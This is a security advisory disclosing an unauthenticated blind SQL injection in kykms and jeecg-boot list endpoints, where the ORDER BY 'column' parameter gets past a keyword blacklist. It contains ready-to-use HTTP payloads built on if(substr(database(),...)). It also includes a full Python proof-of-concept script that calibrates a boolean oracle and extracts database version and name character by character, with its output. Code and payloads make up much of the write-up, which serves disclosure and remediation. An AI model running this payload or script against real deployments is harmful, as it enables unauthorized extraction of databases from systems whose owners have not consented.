# kykms — The front-end bypasses the blacklist without authorization, allowing SQL blind injection

## Introduction

A **front-end (no-login) blind SQL injection** affects kykms. Its public list interfaces take a `column` request parameter that flows through `QueryGenerator.doMultiFieldsOrder` (`QueryGenerator.java:216-250`) and, after the blacklist `SqlInjectionUtil.filterContent`, is handed to MyBatis-Plus `QueryWrapper.orderByAsc/Desc(column)` which concatenates it **directly into the ORDER BY clause**. The blacklist string `"and |...|;|or |+|user()"` (`SqlInjectionUtil.java:15-31`) is missing `if(`, `substr`, `version`, `database`, `benchmark`, so an injected `if(...)` expression runs on the server and the whole database is extractable by boolean blind injection. No login is required on these front-end list endpoints.

## Affected versions

kykms ≤ current (and jeecg-boot reusing `doMultiFieldsOrder` + this blacklist)

## Utilize conditions

- Unauthorized SQL injection at the front end

---

## Vulnerability Reproduction

**Step 1** — normal ordering baseline:

```http
GET /list?column=id&order=asc HTTP/1.1
Host: <target>
```

Response: 8 rows in id order.

![image-20260821120030019](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821120030019.4clma3kka6.webp)

**Step 2** — boolean-blind differential, condition **true** (`database()` first char = `k`, our DB `km_businesss_dev`). Ordered by `id` (desc):

```http
GET /list?column=if(substr(database(),1,1)='k',id,-id)&order=asc HTTP/1.1
Host: <target>
```

![image-20260821120017058](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821120017058.39lwz7p44o.webp)

Response :

```json
{"rows":[{id:8,kiwi},{id:7,grape},...,{id:1,apple}]}
```

**Step 3** — condition **false** (`'z'`), the expression falls to `-id` → **entire table reversed**:

```http
GET /list?column=if(substr(database(),1,1)='z',id,-id)&order=asc HTTP/1.1
Host: <target>
```

![image-20260821120003925](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821120003925.9rk4sj0fsf.webp)

Response :

```json
{"rows":[{id:1,apple},{id:2,banana},...,{id:8,kiwi}]}
```

The two `column` values differ only in the guessed character, yet the 8 rows come back in **exactly opposite order** — proving the `if(...)` expression is evaluated server-side (verified as `ORDER BY if(substr(database(),1,1)='k',id,-id) DESC` in the app log on a live instance, .A scripted boolean-blind extractor (`poc/bool_blind.py`, self-calibrating oracle) recovered:

python poc：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
kykms / jeecg-boot ORDER BY boolean-blind SQL injection — extract version()/database()
================================================================================================
Repro sink:  QueryGenerator.doMultiFieldsOrder -> SqlInjectionUtil.filterContent (blacklist, case-insensitive substring)
          -> MyBatis-Plus QueryWrapper.orderByAsc(column)

High-contrast oracle (0 ambiguity, full row reversal):
    GET /list?column=if(<COND>,id,-id)&order=asc
        COND true  ->  ORDER BY id  ASC   (rows reversed from the false branch)
        COND false ->  ORDER BY -id DESC  (fully reversed)
The two references are CALIBRATED at runtime with calibration probes
    if(1=1,id,-id)  -> REF_TRUE
    if(1=0,id,-id)  -> REF_FALSE
so the script adapts to any table/row count (swap `id` for a real numeric column on a real target).

Blacklist bypass: `if(`, `substr`, `version`, `database` not in xssStr.
"""
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8090/list?"
CHARSET = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-()+*.:/,="

REF_TRUE = None   # calibrated
REF_FALSE = None  # calibrated


def ids_of(cond: str):
    payload = "if({0},id,-id)".format(cond)
    url = BASE + urllib.parse.urlencode({"column": payload, "order": "asc"})
    with urllib.request.urlopen(url, timeout=10) as r:
        return [row["id"] for row in json.loads(r.read().decode()).get("rows", [])]


def oracle(cond: str) -> bool:
    return ids_of(cond) == REF_TRUE


def calibrate():
    global REF_TRUE, REF_FALSE
    REF_TRUE = ids_of("1=1")
    REF_FALSE = ids_of("1=0")
    if REF_TRUE == REF_FALSE or not REF_TRUE:
        raise RuntimeError("calibration failed — oracle columns `id`/`-id` not usable on this target")
    print("[*] REF_TRUE  (cond true ) ids:", REF_TRUE)
    print("[*] REF_FALSE (cond false) ids:", REF_FALSE)


def guess_char(expr: str, pos: int) -> str:
    for c in CHARSET:
        cond = "substr({0},{1},1)='{2}'".format(expr, pos, c.replace("'", "''"))
        if oracle(cond):
            return c
    return "?"


def extract(expr: str, length: int, label: str) -> str:
    out = ""
    for pos in range(1, length + 1):
        out += guess_char(expr, pos)
        sys.stdout.write("\r{0}: {1}".format(label, out))
        sys.stdout.flush()
    sys.stdout.write("\r" + " " * 40 + "\r")
    print("{0} = {1}".format(label, out))
    return out


if __name__ == "__main__":
    calibrate()
    extract("version()", 32, "version()")
    extract("database()", 32, "database()")
```

![image-20260821115901832](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821115901832.icur53t96.webp)

```
version()  = 9.6.0
database() = km_businesss_dev
```



code:

![image-20260821141056250](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821141056250.3gp4uncjm3.webp)

![image-20260821141150955](https://github.com/fangtang7/picx-images-hosting/raw/master/kykms/image-20260821141150955.5q85e4xmuh.webp)
